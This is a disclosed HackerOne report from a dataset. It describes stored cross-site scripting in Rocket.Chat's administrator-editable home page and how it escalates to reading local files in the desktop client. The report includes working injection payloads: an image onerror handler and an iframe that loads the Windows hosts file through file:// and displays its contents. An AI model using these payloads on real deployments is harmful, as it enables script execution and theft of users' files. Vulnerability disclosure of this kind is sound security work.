---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '724153'
original_report_id: '724153'
title: XSS (leads to arbitrary file read in Rocket.Chat-Desktop)
weakness: Cross-site Scripting (XSS) - Stored
team_handle: rocket_chat
created_at: '2019-10-28T19:11:09.189Z'
disclosed_at: '2020-01-02T16:19:08.554Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 10
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# XSS (leads to arbitrary file read in Rocket.Chat-Desktop)

## Metadata

- HackerOne Report ID: 724153
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: rocket_chat
- Disclosed At: 2020-01-02T16:19:08.554Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Description:** Rocket.Chat allows administrative users to customize the home body. Since `<script>` tags are removed, I think that running scripts should not be allowed. However, event handlers are not removed, allowing you to inject your own scripts.

## Releases Affected:

  * Rocket.Chat-Desktop-Client: v2.15.5
  * Rocket.Chat-Server: v2.0.0
  * Apps-Engine-Version: v1.5.2

## Steps To Reproduce (from initial installation to vulnerability):

  - Go to `Administration » Layout » Content`
  - Set `Home Body` to `<img src=0 onerror="alert(0)"/>`
  - Visit `/home`

### Arbitrary file read in Rocket.Chat-Desktop

  - Go to `Administration » Layout » Content`
  - Set `Home Body` to `<iframe src="file://c:/windows/system32/drivers/etc/hosts" onload="alert(iframe.contentDocument.body.innerHTML)" id="iframe"></iframe>`
  - Visit `/home`

## Supporting Material/References:

  * {F613006}
  * {F613007}
  * {F620074}

## Impact

* Attackers can execute scripts which leads to arbitrary file read and rce in Rocket.Chat-Desktop

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
